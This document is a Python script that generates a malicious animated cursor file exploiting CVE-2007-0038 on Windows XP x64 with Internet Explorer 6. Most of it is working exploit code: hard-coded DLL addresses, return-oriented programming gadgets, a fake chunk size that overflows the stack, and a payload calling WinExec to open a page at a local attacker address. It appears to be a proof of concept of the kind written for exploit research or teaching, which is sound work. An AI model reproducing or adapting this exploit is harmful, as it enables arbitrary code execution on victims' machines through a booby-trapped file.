#!/usr/bin/python3

# mk-ani.py
# Make an evil animated cursor (.ani) file that exploits CVE-2007-0038 to open another webpage in
# Internet Explorer 6 on a fresh install of Windows XP Professional x64 Edition SP1

import struct

user32_addr = 0x78c30000 # Address of user32.dll
kernel32_addr = 0x78d40000 # Address of kernel32.dll

ginit = user32_addr + 0x1ccc3 # Address of initialization gadget
gdisp = user32_addr + 0x1cce2 # Address of dispatcher gadget
glearcx = user32_addr + 0xc22d # Address of lea rcx gadget (lea rcx,[rsp+00000090])
k32WinExec = kernel32_addr + 0x79700 # Address of WinExec function

laifunc = user32_addr + 0x4aed0 # Address of LoadAniIcon function
lairet = user32_addr + 0x4b60a # Address of LoadAniIcon return instruction

STR_EXEC = bytes('IEXPLORE http://192.168.1.2:888/evil.html\0', 'ascii') # String to launch new instance of IE6.

# Initialization gadget: (Properly sets RDX, includes dispatcher gadget, also call-preceded)
# mov   r13d,eax
# mov   r8d,eax
# neg   r8d
# lea   rax,[rsp+44]
# mov   [rsp+20],rax
# mov   r9d,00000003
# mov   rdx,rdi
# mov   rcx,r15
# call  qword ptr [rsp+60]

# Dispatcher gadget:
# call  qword ptr [rsp+60]

# lea rcx gadget (Loads address of exec string into RCX.)
# lea   rcx,[rsp+00000090]
# call  rsi

shellcode = bytearray()

for i in range(0, 0x50):
    shellcode += b'A'

shellcode += struct.pack('<Q', k32WinExec)
shellcode += struct.pack('<Q', 0)
shellcode += struct.pack('<Q', glearcx)

for i in range(0, 0x90 - 8 - 8 - 0x60):
    shellcode += b'A'

shellcode += bytes(STR_EXEC)

shellcodesize = len(shellcode)

ret_overwrite = struct.pack("<Q", ginit) # Return to this address, which is ptr to initialization gadget

# RIFF file stuff

RIFFHEAD_FOURCC = bytes('RIFF', 'ascii')
RIFFHEAD_SIZE   = struct.pack('>I', 0xeb3a0000) # Junk
RIFFHEAD_TYPE   = bytes('ACON', 'ascii')

# Ani header stuff

ANIHEAD_FOURCC = bytes('anih', 'ascii') # ID of the ani header chunk

ANIHEAD_SIZE   = struct.pack('<I', 36) # Size of the chunk
ANIHEAD_FRAMES = struct.pack('<I', 2)  # Number of frames
ANIHEAD_STEPS  = struct.pack('<I', 1)  # Animation steps
ANIHEAD_WIDTH  = struct.pack('<I', 0)  # Width
ANIHEAD_HEIGHT = struct.pack('<I', 0)  # Height
ANIHEAD_BITCNT = struct.pack('<I', 0)  # Bits per pixel
ANIHEAD_PLANES = struct.pack('<I', 0)  # Number of color planes
ANIHEAD_RATE   = struct.pack('<I', 16) # Frame rate
ANIHEAD_FLAGS  = struct.pack('<I', 1)  # Flags

padding = bytearray()

# Offsets from RSP

offset_anih = 0x60 # 'anih' is written to RSP+60h
offset_begin = 0x78 # Padding is written here
offset_rdxld = 0xc8 # Value at this offset gets loaded into RDI, then RDX. RDX must hold 0.
offset_dispaddr = 0xd0 # Value at this offset gets loaded to RSI. RSI will hold address of dispatcher gadget.
offset_return = 0xe8 # Return address at RSP+e8.
offset_str = offset_return + 0x90 # Exec string is stored here.

FAKESIZE = struct.pack('<I', offset_return - offset_begin + 8 + shellcodesize) # Fake size of the bad ani header chunk.
for i in range(0, offset_rdxld - offset_begin):
    padding += b'A'

padding += struct.pack('<Q', 5)
padding += struct.pack('<Q', gdisp)

for i in range(0, offset_return  - (offset_dispaddr + 8)):
    padding += b'A'

payload = RIFFHEAD_FOURCC + RIFFHEAD_SIZE + RIFFHEAD_TYPE
payload += ANIHEAD_FOURCC + ANIHEAD_SIZE + ANIHEAD_SIZE  + ANIHEAD_FRAMES + ANIHEAD_STEPS + ANIHEAD_WIDTH
payload += ANIHEAD_HEIGHT + ANIHEAD_BITCNT + ANIHEAD_PLANES + ANIHEAD_RATE + ANIHEAD_FLAGS
payload += ANIHEAD_FOURCC + FAKESIZE + padding + ret_overwrite + shellcode

f = open('payload.ani', 'wb')
f.write(payload)
f.close()

print("payload written")